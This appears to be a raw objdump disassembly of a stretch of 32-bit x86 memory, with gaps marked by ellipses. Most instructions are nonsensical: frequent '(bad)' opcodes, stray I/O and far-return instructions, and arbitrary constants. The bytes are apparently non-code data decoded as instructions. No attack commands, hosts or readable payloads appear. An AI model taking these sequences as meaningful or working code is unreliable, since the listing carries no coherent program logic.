  42e2cd:	mov    DWORD PTR [ecx+eax*8+0xb],esp
  42e2d1:	je     0x42e265
  42e2d3:	retf   
  42e2d4:	jp     0x42e351
  42e2d6:	(bad)  
  42e2d7:	call   FWORD PTR [eax-0x54edd6a]
  42e2dd:	enter  0xbd99,0x84
  42e2e1:	adc    cl,BYTE PTR [ebx+0x1a055b4c]
  42e2e7:	cmc    
  42e2e8:	mov    WORD PTR [ecx+0x42],es
  42e2eb:	aad    0xab
  42e2ed:	inc    ecx
  42e2ee:	iret   
  42e2ef:	int    0x71
  42e2f1:	daa    
  42e2f2:	adc    eax,DWORD PTR [edx-0x62a4a9cf]
  42e2f8:	call   0x4a751c23
  42e2fd:	test   al,0xb0
  42e2ff:	push   ebx
  42e300:	in     al,dx
  42e301:	pop    edx
  42e302:	mov    edi,ebx
  42e304:	pop    edi
  42e305:	cmp    BYTE PTR [ecx-0x670905c2],ah
  42e30b:	xor    al,0xf5
  42e30d:	sar    cl,1
  42e30f:	mov    ds:0xf4a9494e,al
  42e314:	xchg   ebp,eax
  42e315:	xchg   ecx,eax
  42e316:	dec    eax
  42e317:	int    0x25
  42e319:	sub    al,BYTE PTR [edi]
  42e31b:	inc    eax
  42e31c:	jo     0x42e347
  42e31e:	or     al,0xf3
  42e320:	sti    
  42e321:	bound  ebx,QWORD PTR [esi+edx*8]
  42e324:	(bad)  
  42e325:	xor    BYTE PTR [edx-0x48],dl
  42e328:	in     eax,0x32
  42e32a:	lock div DWORD PTR [ebx+0x73]
  42e32e:	mov    ds:0x8ee8df2e,eax
  42e333:	sbb    DWORD PTR [edx-0x48a8225f],ecx
  42e339:	(bad)  
  42e33a:	fisub  WORD PTR [esi+0x19]
  42e33d:	inc    ebx
  42e33e:	sbb    ebx,esp
  42e340:	inc    edx
  42e341:	jecxz  0x42e336
  42e343:	jb     0x42e3a0
  42e345:	push   0x680799f3
  42e34a:	mov    ebx,0x36b4218d
  42e34f:	push   ss
  42e350:	jg     0x42e381
  42e352:	in     eax,dx
  42e353:	aad    0x96
  42e355:	mov    ebx,0xe3f514f4
  42e35a:	xor    ebp,DWORD PTR [eax+0x4482266a]
  42e360:	dec    esp
  42e361:	and    eax,0xd85cbc1
  42e366:	inc    esp
  42e367:	sub    DWORD PTR [esp+edi*2+0x76176358],eax
  42e36e:	daa    
  42e36f:	ja     0x42e3d4
  42e371:	add    esp,DWORD PTR [ecx]
  42e373:	lds    esp,FWORD PTR [edi-0x7ff640e0]
  42e379:	into   
  42e37a:	add    ebx,ebp
  42e37c:	stos   DWORD PTR es:[edi],eax
  42e37d:	imul   edi,ebx,0x62b023de
  42e383:	ss mov cl,0xf6
  42e387:	out    0xb,al
  42e389:	js     0x42e3fd
  42e38b:	mov    ebx,0xc6b878ce
  42e390:	mov    ds:0x37216836,al
  42e395:	loop   0x42e392
  42e397:	test   BYTE PTR ds:0xec920d84,0xc6
  42e39e:	scas   eax,DWORD PTR es:[edi]
  42e39f:	mov    eax,ds:0x5c0355f4
  42e3a4:	cmp    ch,BYTE PTR [esi-0x6a]
  42e3a7:	dec    eax
  42e3a8:	xor    eax,0x5f8401b9
  42e3ad:	dec    ebx
  42e3ae:	xchg   edx,eax
  42e3af:	aas    
  42e3b0:	std    
  42e3b1:	aas    
  42e3b2:	inc    edi
  42e3b3:	xchg   ebx,eax
  42e3b4:	sbb    al,0x0
	...
  42e416:	loop   0x42e3d5
  42e418:	fadd   st(7),st
  42e41a:	(bad)  
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	push   es
  42e423:	sbb    ah,cl
  42e425:	lahf   
  42e426:	pushf  
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [ebp-0x5c],ah
  42e430:	inc    eax
  42e431:	inc    ebx
  42e432:	xchg   edx,eax
  42e433:	xchg   ecx,eax
  42e434:	bound  edx,QWORD PTR [esi]
  42e436:	mov    ?,WORD PTR [eax+0x62387099]
  42e43c:	mov    dh,0x68
  42e43e:	sar    BYTE PTR [edx],1
  42e440:	mov    edi,0xc8979364
  42e445:	js     0x42e3de
  42e447:	outs   dx,DWORD PTR ds:[esi]
  42e448:	sar    BYTE PTR [edi-0x35],cl
  42e44b:	in     eax,dx
  42e44c:	pop    ds
  42e44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e44e:	inc    BYTE PTR [esp+edi*4]
  42e451:	lods   al,BYTE PTR ds:[esi]
  42e452:	loopne 0x42e3e1
  42e454:	mov    ebp,0x9be6a3f6
  42e459:	retf   
  42e45a:	clc    
  42e45b:	pusha  
  42e45c:	dec    edi
  42e45d:	dec    esi
  42e45e:	cmp    cl,BYTE PTR [ebx]
  42e460:	xchg   esi,eax
  42e461:	xchg   ebp,eax
  42e462:	jmp    0xb33ffe7b
  42e467:	push   edx
  42e468:	or     BYTE PTR ds:0xabfa49bc,0xe
  42e46f:	into   
  42e470:	inc    edx
  42e471:	sbb    eax,0xf6a8f60b
  42e476:	js     0x42e4ba
  42e478:	mov    al,ds:0xbbddc3cb
  42e47d:	lahf   
  42e47e:	ja     0x42e49e
  42e480:	dec    eax
  42e481:	jge    0x42e456
  42e483:	rcl    BYTE PTR ds:0xbe2ed618,1
  42e489:	mov    eax,ds:0x7b419dfa
  42e48e:	jbe    0x42e4cd
  42e490:	sbb    DWORD PTR [eax+0x7],ebp
  42e493:	in     al,dx
  42e494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e495:	adc    DWORD PTR [edi-0x716267ae],ebx
  42e49b:	loopne 0x42e48f
  42e49d:	jne    0x42e4d5
  42e49f:	jae    0x42e469
  42e4a1:	jb     0x42e4c4
  42e4a3:	xchg   ebp,eax
  42e4a4:	or     eax,0x7ef7f539
  42e4a9:	inc    edi
  42e4aa:	test   BYTE PTR [esp+eiz*8],dl
  42e4ad:	cmp    ebx,eax
  42e4af:	xor    ecx,DWORD PTR [edi-0x347add9]
  42e4b5:	inc    edi
  42e4b6:	and    DWORD PTR [ecx-0x9],esi
  42e4b9:	fimul  WORD PTR [edi-0x621a7061]
  42e4bf:	mov    eax,0xf14be8eb
  42e4c4:	fwait
  42e4c5:	sti    
  42e4c6:	imul   esp,DWORD PTR [esi*2-0xecc76bf],0x2c
  42e4ce:	add    al,0x60
  42e4d0:	mov    ebx,0xf8a6bb2c
  42e4d5:	ja     0x42e48b
  42e4d7:	push   0x73
  42e4d9:	(bad)  
  42e4db:	adc    BYTE PTR [edx-0x40],ah
  42e4de:	inc    ecx
  42e4df:	fcomp  DWORD PTR [edi+0x4995363c]
  42e4e5:	sbb    cl,ah
  42e4e7:	adc    BYTE PTR [ebx-0x490918ad],0xbd
  42e4ee:	rcr    DWORD PTR [eax+0x350f2eb9],1
  42e4f4:	mov    ebp,?
  42e4f6:	and    edi,DWORD PTR [ecx-0x4e68fbe0]
  42e4fc:	cmp    cl,dh
  42e4fe:	int    0xf5
  42e500:	mov    dh,0xdd
  42e502:	loope  0x42e583
  42e504:	sar    BYTE PTR [esi],1
  42e506:	xchg   edx,eax
  42e507:	push   edi
  42e508:	add    eax,0x22e01606
  42e50d:	pop    esp
  42e50e:	imul   ebx,DWORD PTR [ecx+eax*8+0x6d],0x60
  42e513:	xor    ah,ch
  42e515:	outs   dx,DWORD PTR ds:[esi]
  42e516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e517:	test   BYTE PTR [ebp+0x57],dh
  42e51a:	rcr    BYTE PTR [esi],cl
  42e51c:	dec    edx
  42e51d:	push   es
  42e51e:	jbe    0x42e577
  42e520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e521:	adc    edx,DWORD PTR [ecx+0x5c]
  42e524:	dec    esi
  42e525:	bsr    esi,DWORD PTR [ebp-0x13e56e67]
  42e52c:	mov    al,BYTE PTR [esi+ebp*8+0x51]
  42e530:	test   al,0x51
  42e532:	and    DWORD PTR [esp+ecx*8+0x0],edx
	...
  42e596:	push   ebp
  42e597:	cmp    dh,cl
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5a3:	xor    eax,0xf0a3c6fd
  42e5a8:	add    DWORD PTR [eax],eax
  42e5aa:	pop    es
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [edi],bh
  42e5af:	ficomp DWORD PTR [esi+0x154c3ec5]
  42e5b5:	cmp    ebp,edi
  42e5b7:	xchg   edi,eax
  42e5b8:	data16 jp 0x42e5b5
  42e5bb:	cdq    
  42e5bc:	and    al,0x43
  42e5be:	out    0x8,al
  42e5c0:	(bad)  
  42e5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5c2:	xchg   esp,eax
  42e5c3:	xor    DWORD PTR [edi+0x7f],edx
  42e5c6:	outs   dx,BYTE PTR ds:[esi]
  42e5c7:	aas    
  42e5c8:	and    al,0xf1
  42e5ca:	jb     0x42e644
  42e5cc:	lea    eax,[ecx-0x3979a71b]
  42e5d2:	loope  0x42e5ad
  42e5d4:	or     bl,bh
  42e5d6:	sub    DWORD PTR [esi+esi*2+0x6d],0xa0dba32d
  42e5de:	and    eax,0x43a29022
  42e5e3:	(bad)  
  42e5e5:	stc    
  42e5e6:	(bad)  
  42e5e7:	bound  ebx,QWORD PTR [ebp*8+0x59a65cfd]
  42e5ee:	push   esi
  42e5ef:	test   DWORD PTR [ecx-0x86d9911],0x9b266b7e
  42e5f9:	inc    eax
  42e5fa:	retf   
  42e5fb:	jbe    0x42e5dc
  42e5fd:	xor    ah,al
  42e5ff:	call   0x3e5ff75f
  42e604:	jnp    0x42e586
  42e606:	or     eax,0x6fb4b55f
  42e60b:	mov    dl,0x58
  42e60d:	test   BYTE PTR [eax-0x4ae81282],dh
  42e613:	test   eax,0xb1e3ae0f
  42e618:	ret    
  42e619:	xor    DWORD PTR [edi-0x12],edx
  42e61c:	add    BYTE PTR [esi+0x4398e671],al
  42e622:	sub    al,0x76
  42e624:	jb     0x42e6a5
  42e626:	mov    esp,0xe915c3c
  42e62b:	xor    edx,DWORD PTR [ecx+0x12b7b013]
  42e631:	repnz adc eax,0x76d087cd
  42e637:	jge    0x42e681
  42e639:	add    BYTE PTR ds:0x59579407,0x80
  42e640:	mov    ah,0x27
  42e642:	jns    0x42e66a
  42e644:	xchg   ebp,eax
  42e645:	adc    BYTE PTR [ebx-0x5f4aada2],ah
  42e64b:	in     eax,0x95
  42e64d:	pop    ebp
  42e64e:	int3   
  42e64f:	sbb    al,al
  42e651:	pop    edx
  42e652:	shl    DWORD PTR [ecx+0x738e43f4],1
  42e658:	shr    BYTE PTR [edx+0x75],1
  42e65b:	stc    
  42e65c:	cmp    al,0x4f
  42e65e:	or     edx,ebp
  42e660:	mov    ch,0x91
  42e662:	sbb    al,0x5b
  42e664:	mov    edi,0x267e3515
  42e669:	leave  
  42e66a:	or     BYTE PTR [eax],dh
  42e66c:	push   edx
  42e66d:	cmp    BYTE PTR [ebp+0x62],cl
  42e670:	adc    al,0xa3
  42e672:	and    DWORD PTR [eax-0x23],eax
  42e675:	(bad)  
  42e676:	xor    al,0x31
  42e678:	call   0xd2981e80
  42e67d:	dec    eax
  42e67e:	enter  0xabc8,0x40
  42e682:	sbb    BYTE PTR [edi-0x28552c67],dl
  42e688:	jecxz  0x42e65f
  42e68a:	sbb    al,0x7c
  42e68c:	mov    ah,0x8f
  42e68e:	jle    0x42e6f4
  42e690:	or     BYTE PTR [esi-0x66],al
  42e693:	(bad)  
  42e694:	imul   ebx,DWORD PTR [edx-0x45],0xfffffff9
  42e698:	hlt    
  42e699:	mov    eax,ds:0x395b6726
  42e69e:	xor    dh,al
  42e6a0:	retf   
  42e6a1:	mov    edi,fs
  42e6a3:	scas   al,BYTE PTR es:[edi]
  42e6a4:	arpl   WORD PTR [ebx],si
  42e6a6:	in     al,dx
  42e6a7:	cmp    eax,0x9412dbe2
  42e6ac:	mov    al,0xac
  42e6ae:	sbb    eax,0x3530af30
  42e6b3:	das    
  42e6b4:	pop    esi
	...
  42e715:	add    BYTE PTR [edx+0x39],bl
  42e718:	dec    esi
  42e719:	sub    eax,0x7f7b7f6f
  42e71e:	scas   al,BYTE PTR es:[edi]
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	xor    eax,0xaa214f7c
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [edx-0x1ead167d],ah
  42e733:	stos   DWORD PTR es:[edi],eax
  42e734:	fwait
  42e735:	xchg   esp,eax
  42e736:	xor    al,al
  42e738:	dec    esi
  42e739:	adc    BYTE PTR [eax*4-0x7dce8417],al
  42e740:	popa   
  42e741:	pop    edx
  42e742:	cs xchg ebx,eax
  42e744:	shl    BYTE PTR [edi-0x74f0bfea],1
  42e74a:	xchg   edi,eax
  42e74b:	jno    0x42e755
  42e74d:	xchg   ebx,eax
  42e74f:	(bad)  
  42e750:	lock or DWORD PTR [ecx+0x4df686f4],esi
  42e757:	mov    bh,0xbf
  42e759:	shr    DWORD PTR [edi-0x59e508a6],0x96
  42e760:	adc    BYTE PTR [ecx-0x6b8c6dfe],dl
  42e766:	dec    edx
  42e767:	fnstsw WORD PTR ds:0x63c6d404
  42e76d:	push   ss
  42e76e:	inc    edx
  42e76f:	mov    ah,0x52
  42e771:	aad    0xf5
  42e773:	test   eax,0x97925e90
  42e778:	cmp    DWORD PTR [eax],ebx
  42e77a:	dec    edx
  42e77b:	dec    esp
  42e77c:	jo     0x42e771
  42e77e:	dec    ebx
  42e77f:	dec    ecx
  42e780:	pop    ebp
  42e781:	ss out 0x8b,al
  42e784:	nop
  42e785:	sub    BYTE PTR [ebx+eiz*1],dl
  42e788:	add    eax,0x9cadb46f
  42e78d:	sar    BYTE PTR [esi],0xa3
  42e790:	call   DWORD PTR [ecx+0x48]
  42e793:	dec    esp
  42e794:	sbb    ebp,ebp
  42e796:	push   ecx
  42e797:	aam    0x75
  42e799:	imul   edi,ebp,0x46970569
  42e79f:	lds    ebp,FWORD PTR [esi-0x1b]
  42e7a2:	sti    
  42e7a3:	lods   al,BYTE PTR ds:[esi]
  42e7a4:	mov    DWORD PTR [edi+0x1f],esi
  42e7a7:	je     0x42e737
  42e7a9:	mov    eax,ds:0x8e8ad721
  42e7ae:	mov    DWORD PTR [esi+0x7],ebp
  42e7b1:	mov    DWORD PTR [ecx+0x2d],edi
  42e7b4:	outs   dx,DWORD PTR ds:[esi]
  42e7b5:	xchg   esp,eax
  42e7b6:	pop    edx
  42e7b7:	int3   
  42e7b8:	cmp    eax,0xd327ce05
  42e7bd:	add    ah,dl
  42e7bf:	jle    0x42e838
  42e7c1:	or     DWORD PTR ds:0x9517e7dc,0xe94055f5
  42e7cb:	push   0xd06ddc8a
  42e7d0:	jge    0x42e801
  42e7d2:	lahf   
  42e7d3:	lahf   
  42e7d4:	leave  
  42e7d5:	(bad)  
  42e7d6:	cli    
  42e7d7:	fimul  DWORD PTR [ebx+0x10c5ad2b]
  42e7dd:	ror    esp,1
  42e7df:	loopne 0x42e81d
  42e7e1:	sbb    eax,DWORD PTR [ebx+0xde4650]
  42e7e7:	sbb    al,0x10
  42e7e9:	xor    eax,0xc0b0a5
  42e7ee:	aad    0x31
  42e7f0:	mov    eax,ds:0xa32bcb3f
  42e7f5:	daa    
  42e7f6:	pop    es
  42e7f7:	push   edx
  42e7f8:	mov    ebp,0x69cf9453
  42e7fd:	cmp    eax,DWORD PTR [ebp+0x23568b39]
  42e803:	add    BYTE PTR [edx+0xebec26],cl
  42e809:	xchg   esp,eax
  42e80a:	push   eax
  42e80b:	sbb    DWORD PTR [ecx],0xc3bad642
  42e811:	add    BYTE PTR [ecx+0x31],0xea
  42e815:	jge    0x42e880
  42e817:	jno    0x42e889
  42e819:	adc    BYTE PTR [esi],ah
  42e81b:	dec    eax
  42e81c:	add    DWORD PTR [edi],esp
  42e81e:	add    ah,BYTE PTR [eax-0x732667ea]
  42e824:	loop   0x42e884
  42e826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e827:	popf   
  42e828:	test   al,0x98
  42e82a:	push   cs
  42e82b:	mov    ch,0x41
  42e82d:	sbb    BYTE PTR [ecx+0x7b],dl
  42e830:	jae    0x42e83c
  42e832:	and    al,0x6
  42e834:	mov    ds:0x0,eax
	...
  42e895:	add    bl,al
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x406f13c3]
  42e8a3:	ret    
  42e8a4:	dec    esi
  42e8a5:	pusha  
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [edi],cl
  42e8af:	xor    eax,DWORD PTR [ebx-0x71]
  42e8b2:	sub    al,0xd8
  42e8b4:	loopne 0x42e898
  42e8b6:	ror    DWORD PTR [esp+eiz*2+0x3491c8ab],0x8c
  42e8be:	fstp   QWORD PTR [ebx-0x6f]
  42e8c1:	xchg   ebx,eax
  42e8c2:	in     eax,0x78
  42e8c4:	push   edi
  42e8c5:	out    dx,al
  42e8c6:	sbb    edx,esp
  42e8c8:	push   esp
  42e8c9:	mov    bl,0x68
  42e8cb:	push   eax
  42e8cc:	int    0xd
  42e8ce:	xchg   BYTE PTR [ebx-0x3767888b],cl
  42e8d4:	inc    edi
  42e8d5:	out    0x1,eax
  42e8d7:	fs sub al,0xaa
  42e8da:	test   DWORD PTR [edx],ecx
  42e8dc:	cwde   
  42e8dd:	dec    esp
  42e8de:	jne    0x42e86d
  42e8e0:	imul   edx,DWORD PTR [eax+esi*4+0x458d6777],0xffffff8b
  42e8e8:	aaa    
  42e8e9:	lods   al,BYTE PTR ds:[esi]
  42e8ea:	mov    edi,0xf9534272
  42e8ef:	add    BYTE PTR [eax-0x6387c387],0x8f
  42e8f6:	xor    al,0xac
  42e8f8:	outs   dx,DWORD PTR ds:[esi]
  42e8f9:	xchg   edi,eax
  42e8fa:	imul   ecx,edi,0xfffffff6
  42e8fd:	mov    BYTE PTR [ebp+0x7378b892],al
  42e903:	mov    esi,0x1cb727ae
  42e908:	dec    ebx
  42e909:	lock cld 
  42e90b:	sbb    eax,0x898ddf22
  42e910:	retf   
  42e911:	add    BYTE PTR [eax],cl
  42e913:	outs   dx,BYTE PTR ds:[esi]
  42e914:	fdiv   QWORD PTR [edi]
  42e916:	inc    edi
  42e917:	iret   
  42e918:	clc    
  42e919:	pop    edi
  42e91a:	lahf   
  42e91b:	lods   al,BYTE PTR ds:[esi]
  42e91c:	sbb    eax,0x59829b38
  42e921:	cld    
  42e922:	scas   eax,DWORD PTR es:[edi]
  42e923:	lods   al,BYTE PTR ds:[esi]
  42e924:	(bad)  [esi+0x37]
  42e927:	lock cmp BYTE PTR [edi-0x76494ec3],bh
  42e92e:	ja     0x42e8f9
  42e930:	cmp    DWORD PTR [esi+0x69],0x6
  42e934:	mov    ds:0x5b30a1c6,eax
  42e939:	ds std 
  42e93b:	sbb    eax,0x6ca5ce68
  42e940:	imul   edi,DWORD PTR [edi+0x1d],0xffffffc6
  42e944:	lock fisttp DWORD PTR ds:[ebx+0xbc232c4]
  42e94c:	jl     0x42e96f
  42e94e:	xor    al,0x1d
  42e950:	mov    bl,0x3f
  42e952:	mov    bl,0x58
  42e954:	sub    edi,DWORD PTR [esi-0x41eff775]
  42e95a:	and    ecx,eax
  42e95c:	mov    ch,0xcd
  42e95e:	adc    BYTE PTR [edx+0x222d1e04],ah
  42e964:	or     BYTE PTR [edi],0xb4
  42e967:	add    al,0x46
  42e969:	icebp  
  42e96a:	frndint 
  42e96c:	xor    BYTE PTR [ecx+0x3e],ah
  42e96f:	push   0x24
  42e971:	adc    esi,esp
  42e973:	fs pop esi
  42e975:	push   ecx
  42e976:	pusha  
  42e977:	adc    eax,0xc192a46a
  42e97c:	sbb    eax,0xde03e8d8
  42e981:	loopne 0x42e911
  42e983:	aam    0x18
  42e985:	addr16 and esp,esi
  42e988:	fcomp  DWORD PTR [edx+0x55]
  42e98b:	in     eax,dx
  42e98c:	retf   0xa9de
  42e98f:	dec    ecx
  42e990:	popf   
  42e991:	sbb    al,0x17
  42e993:	stos   BYTE PTR es:[edi],al
  42e994:	add    esi,ecx
  42e996:	cmp    BYTE PTR [ecx+0x47f16966],0x8e
  42e99d:	pop    ebx
  42e99e:	(bad)  
  42e99f:	loop   0x42e95b
  42e9a1:	cmp    esp,DWORD PTR [ecx+eiz*1-0xbeb446e]
  42e9a8:	test   eax,0xd2fda062
  42e9ad:	xchg   BYTE PTR [esp+eiz*2+0x4080e017],cl
  42e9b4:	inc    edi
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	dec    esp
  42ea23:	jnp    0x42e9ce
  42ea25:	mov    bh,BYTE PTR [eax+0x70001f3]
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [eax],al
  42ea2f:	jno    0x42ea8c
  42ea31:	jecxz  0x42ea83
  42ea33:	inc    edi
  42ea34:	push   DWORD PTR [edi]
  42ea36:	pop    edx
  42ea37:	lahf   
  42ea38:	fdivr  QWORD PTR [ebp+0x2be8de85]
  42ea3e:	cmc    
  42ea3f:	gs inc edi
  42ea41:	mov    BYTE PTR [ebx+0x2d],ah
  42ea44:	call   DWORD PTR [edi-0x5e]
  42ea47:	cmp    ebx,DWORD PTR ss:[ebx+ebx*2]
  42ea4b:	dec    esi
  42ea4c:	and    al,BYTE PTR [esi+0x21]
  42ea4f:	retfw  0x3895
  42ea53:	adc    bl,ah
  42ea55:	jle    0x42ea4b
  42ea57:	mov    bh,0x2d
  42ea59:	mov    esi,0xb8796c3f
  42ea5e:	jae    0x42ea33
  42ea60:	data16 (bad) 
  42ea62:	jae    0x42ead8
  42ea64:	fwait
  42ea65:	pop    es
  42ea66:	push   ds
  42ea67:	(bad)  
  42ea68:	mov    ebp,0xd87825ef
  42ea6d:	dec    ebp
  42ea6e:	jp     0x42ea61
  42ea70:	adc    eax,0x314e906b
  42ea75:	jae    0x42ea18
  42ea77:	fistp  QWORD PTR [ebx+0x4dfa34d1]
  42ea7d:	jno    0x42ea8a
  42ea7f:	xchg   edx,eax
  42ea80:	addr16 and al,ah
  42ea83:	jecxz  0x42ea3c
  42ea85:	dec    ecx
  42ea86:	mov    BYTE PTR [esp+esi*4],ch
  42ea89:	repz sbb edi,ebx
  42ea8c:	loopne 0x42ea82
  42ea8e:	es cdq 
  42ea90:	(bad)  
  42ea91:	push   esp
  42ea92:	add    BYTE PTR [edx],dh
  42ea94:	pop    ss
  42ea95:	inc    ebx
  42ea96:	and    edi,ecx
  42ea98:	(bad)  
  42ea99:	mov    esp,0xd3190a21
  42ea9e:	nop
  42ea9f:	int    0x53
  42eaa1:	test   DWORD PTR [ecx*1-0x403dcac5],edx
  42eaa8:	sub    bl,0x7f
  42eaab:	push   edi
  42eaac:	lods   al,BYTE PTR ds:[esi]
  42eaad:	into   
  42eaae:	sub    edx,esp
  42eab0:	push   ss
  42eab1:	inc    esp
  42eab2:	inc    edi
  42eab3:	mov    DWORD PTR [esi-0x9],edi
  42eab6:	mov    dl,0xc0
  42eab8:	xor    ebx,edx
  42eaba:	dec    ebx
  42eabb:	minps  xmm0,XMMWORD PTR [edi-0x2e7ec263]
  42eac2:	cs dec esi
  42eac4:	or     ebx,DWORD PTR [ebp-0x60]
  42eac7:	lds    edi,FWORD PTR [esi+eiz*2+0x51]
  42eacb:	mov    edi,edx
  42eacd:	push   edi
  42eace:	ss inc eax
  42ead0:	mov    edx,0xf762501
  42ead5:	and    ebx,DWORD PTR [ecx-0x67eed418]
  42eadb:	cli    
  42eadc:	or     ecx,eax
  42eade:	dec    ebp
  42eadf:	jne    0x42eacf
  42eae1:	inc    edx
  42eae2:	nop
  42eae3:	push   edi
  42eae4:	push   esi
  42eae5:	mov    ds:0xeb33e2bc,al
  42eaea:	adc    cl,bl
  42eaec:	mov    dh,0xe1
  42eaee:	add    cl,BYTE PTR [eiz*2-0x49e392ce]
  42eaf5:	mov    esi,0x10ada746
  42eafa:	(bad)  
  42eafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eafc:	jne    0x42eabb
  42eafe:	and    eax,0x7b61e716
  42eb03:	and    DWORD PTR [ebx],eax
  42eb05:	cmp    bh,BYTE PTR [edi]
  42eb07:	sub    DWORD PTR [esi-0x53],esi
  42eb0a:	xchg   ebx,eax
  42eb0b:	push   ebp
  42eb0c:	daa    
  42eb0d:	add    dl,BYTE PTR [ecx]
  42eb0f:	add    DWORD PTR [ebx-0x33],edi
  42eb12:	loopne 0x42eae1
  42eb14:	xor    dl,BYTE PTR [ebp-0x32eee4a8]
  42eb1a:	ror    DWORD PTR [edi+0x1d9a20b1],cl
  42eb20:	xor    cl,BYTE PTR [esi]
  42eb22:	js     0x42eb9a
  42eb24:	test   BYTE PTR [eax+0x74],dl
  42eb27:	(bad)  
  42eb28:	bound  edi,QWORD PTR [esi+0x18f9fa7d]
  42eb2e:	jbe    0x42eb29
  42eb30:	cld    
  42eb31:	xchg   ebx,eax
  42eb32:	jnp    0x42eb87
  42eb34:	jb     0x42eb36
	...
  42eb96:	jle    0x42ebd9
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x16665ada],ebp
  42eba4:	(bad)  
  42eba5:	int    0xbf
  42eba7:	hlt    
  42eba8:	add    DWORD PTR [eax],eax
  42ebaa:	pop    es
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    bh,ah
  42ebaf:	mov    ch,al
  42ebb1:	pop    edi
  42ebb2:	and    al,0xaa
  42ebb4:	or     BYTE PTR [edx],al
  42ebb6:	jae    0x42eb97
  42ebb8:	jb     0x42ec25
  42ebba:	pop    ss
  42ebbb:	cdq    
  42ebbc:	sbb    bl,BYTE PTR [ecx+0x3686689d]
  42ebc2:	sbb    al,0x66
  42ebc4:	pusha  
  42ebc5:	mov    ch,0xbe
  42ebc7:	add    al,0x77
  42ebc9:	add    eax,0xafdbc7a3
  42ebce:	push   ebx
  42ebd0:	arpl   WORD PTR ds:0xf8cff807,bp
  42ebd6:	clc    
  42ebd7:	lods   al,BYTE PTR ds:[esi]
  42ebd8:	scas   eax,DWORD PTR es:[edi]
  42ebd9:	data16 mov ds:0x60e82ec,al
  42ebdf:	sub    ecx,esp
  42ebe1:	mov    ebx,0x36d06b7d
  42ebe6:	xchg   edx,eax
  42ebe7:	js     0x42ec3e
  42ebe9:	or     BYTE PTR [eax-0x6a],0x2a
  42ebed:	dec    edx
  42ebee:	shl    BYTE PTR [ebx-0x1f],0x4c
  42ebf2:	pop    ecx
  42ebf3:	mov    DWORD PTR [ebp-0x7b6c1e8],0x7b7bad03
  42ebfd:	fdivp  st(0),st
  42ebff:	or     edi,edx
  42ec01:	jle    0x42ec33
  42ec03:	inc    ebp
  42ec04:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42ec06:	mov    dl,0xd7
  42ec08:	xor    BYTE PTR [ebx-0x73d4181f],ch
  42ec0e:	rcl    BYTE PTR [edx-0x1b],1
  42ec11:	mov    ebp,ebp
  42ec13:	scas   al,BYTE PTR es:[edi]
  42ec14:	mov    dl,0x65
  42ec16:	(bad)  
  42ec17:	(bad)  [ecx-0xf5cd1ac]
  42ec1d:	daa    
  42ec1e:	jnp    0x42ebf4
  42ec20:	ss ret 
  42ec22:	test   eax,0x3daef086
  42ec27:	pop    esp
  42ec28:	pop    ebp
  42ec29:	icebp  
  42ec2a:	pop    ebx
  42ec2b:	xchg   esp,eax
  42ec2c:	imul   eax,edi,0x18
  42ec2f:	cmp    BYTE PTR [edi],0x6d
  42ec32:	jg     0x42ec91
  42ec34:	push   ebx
  42ec35:	mov    cs,WORD PTR [edi]
  42ec37:	(bad)  
  42ec38:	mov    ch,0x48
  42ec3a:	aaa    
  42ec3b:	and    eax,0x6464ae53
  42ec40:	in     eax,dx
  42ec41:	xchg   ebx,eax
  42ec42:	dec    edi
  42ec43:	mov    edx,0x4a7f78b3
  42ec48:	mov    esi,0x6482218f
  42ec4d:	mov    ds:0x6f5cb814,al
  42ec52:	mov    BYTE PTR [edi-0x436cc7e4],dl
  42ec58:	adc    al,0x59
  42ec5a:	mov    ch,0x64
  42ec5c:	int    0x0
  42ec5e:	inc    esi
  42ec5f:	fs nop
  42ec61:	data16 xor BYTE PTR [edx],al
  42ec64:	xlat   BYTE PTR ds:[ebx]
  42ec65:	pop    es
  42ec66:	sub    BYTE PTR ds:[esi],dh
  42ec69:	iret   
  42ec6a:	les    esi,FWORD PTR [edx]
  42ec6c:	nop
  42ec6d:	cdq    
  42ec6e:	mov    dl,0xe
  42ec70:	test   BYTE PTR [ecx+0x79],bh
  42ec73:	sub    DWORD PTR [ebx-0x6ed8302a],edi
  42ec79:	iret   
  42ec7a:	es lock in eax,0x78
  42ec7e:	sbb    al,0xed
  42ec80:	push   ebp
  42ec81:	out    0xf6,eax
  42ec83:	jae    0x42ec32
  42ec85:	hlt    
  42ec86:	lock pushf 
  42ec88:	push   es
  42ec89:	fwait
  42ec8a:	inc    ebp
  42ec8b:	sbb    al,0xc7
  42ec8d:	mov    al,ds:0x8fd09f5c
  42ec92:	inc    esp
